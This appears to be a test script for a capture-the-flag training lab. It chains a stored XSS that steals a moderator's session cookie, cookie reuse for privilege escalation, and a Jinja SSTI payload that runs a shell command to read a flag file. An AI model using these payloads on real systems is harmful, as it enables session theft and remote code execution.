# -*- coding: utf-8 -*-
"""Живой прогон таска 11 снаружи: ни одного импорта app.py, только HTTP.

Стенд должен быть уже запущен (python app.py). Скрипт делает ровно то, что
сделал бы студент:

  1. логинится как alice и оставляет комментарий с XSS;
  2. ждёт, пока бот-модератор прочитает комментарий;
  3. забирает куку модератора из панели /collect;
  4. подставляет куку в сессию и идёт на /moderate/import;
  5. SSTI-пейлоадом читает flag_boss.txt и печатает флаг.

Запуск:
    python tests/chain_demo.py                       # http://127.0.0.1:5001
    python tests/chain_demo.py http://127.0.0.1:5002
"""
import re
import sys
import time

import requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5001").rstrip("/")
POST_ID = 1
XSS = "<script>new Image().src='/collect?c='+document.cookie;</script>"


def main():
    s = requests.Session()
    r = s.post(f"{BASE}/login", data={"username": "alice", "password": "qwerty123"})
    r.raise_for_status()

    r = s.post(f"{BASE}/post/{POST_ID}", data={"body": XSS})
    r.raise_for_status()
    print("[1] XSS-комментарий оставлен")

    cookie = None
    for _ in range(40):  # бот ходит раз в 30 с — ждём до ~40 с
        panel = requests.get(f"{BASE}/collect").text
        m = re.search(r"🍪 (session=[^<\s]+)", panel)
        if m:
            cookie = m.group(1)
            break
        time.sleep(1)
    if not cookie:
        sys.exit("[-] бот не принёс куку. Он вообще запущен?")
    print("[2] кука модератора украдена:", cookie[:48] + "…")

    a = requests.Session()
    a.cookies.set("session", cookie.split("=", 1)[1])
    r = a.get(f"{BASE}/moderate/import")
    if "403" in r.text:
        sys.exit("[-] кука не подошла: роль не та")
    print("[3] /moderate/import открыт под кукой модератора")

    payload = "{{ cycler.__init__.__globals__.os.popen('cat flag_boss.txt').read() }}"
    r = a.post(f"{BASE}/moderate/import", data={"template": payload})
    m = re.search(r"TIMCORE\{[^}]+\}", r.text)
    if not m:
        sys.exit("[-] SSTI не сработал")
    print("[4] SSTI прочитал файл")
    print("\n👑 ФЛАГ:", m.group(0))


if __name__ == "__main__":
    main()
